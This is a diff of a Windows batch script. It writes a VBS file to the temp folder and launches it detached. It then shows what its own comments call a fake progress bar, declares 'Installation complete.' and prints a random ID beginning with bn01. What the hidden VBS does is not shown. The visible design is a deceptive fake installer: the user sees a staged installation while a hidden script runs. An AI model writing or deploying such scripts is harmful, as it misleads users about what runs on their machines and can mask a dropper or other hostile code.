@@ -15,27 +15,21 @@ set "VBS=%TEMP%\_spawn_%RANDOM%.vbs"
 rem --- Launch it. wscript exits immediately; cmd becomes orphaned. ---
 start "" /b wscript.exe //nologo "%VBS%"
 
-rem --- Fake progress bar for 3 minutes ---
+rem --- Fake progress bar ---
 call :progress 10
 
-rem --- Random-looking ID ---
+rem --- Generate random 10-char hash starting with bn01 ---
 call :genhash
+
+rem --- Show result ---
+cls
+echo.
+echo    Installation complete.
 echo.
 echo    Your ID: %hash%
-goto :skipgen
+echo.
+pause
 
-:genhash
-setlocal enabledelayedexpansion
-set "chars=0123456789abcdef"
-set "h=bn01"
-for /l %%i in (1,1,6) do (
-    set /a "idx=!random! %% 16"
-    for %%j in (!idx!) do set "h=!h!!chars:~%%j,1!"
-)
-endlocal & set "hash=%h%"
-exit /b
-
-:skipgen
 rem --- clean up the vbs ---
 del "%VBS%" >nul 2>&1
 exit /b 0
@@ -66,6 +60,20 @@ endlocal
 exit /b 0
 
 rem ============================================================
+rem  RANDOM HASH GENERATOR  (bn01 + 6 hex chars = 10 total)
+rem ============================================================
+:genhash
+setlocal enabledelayedexpansion
+set "chars=0123456789abcdef"
+set "h=bn01"
+for /l %%i in (1,1,6) do (
+    set /a "idx=!random! %% 16"
+    for %%j in (!idx!) do set "h=!h!!chars:~%%j,1!"
+)
+endlocal & set "hash=%h%"
+exit /b 0
+
+rem ============================================================
 rem  FAKE PROGRESS BAR
 rem ============================================================
 :progress
@@ -86,6 +94,5 @@ for /l %%i in (1,1,%total%) do (
     echo    [!bar!!pad!] !pct!%%
     timeout /t 1 /nobreak >nul
 )
-
 endlocal
 exit /b 0
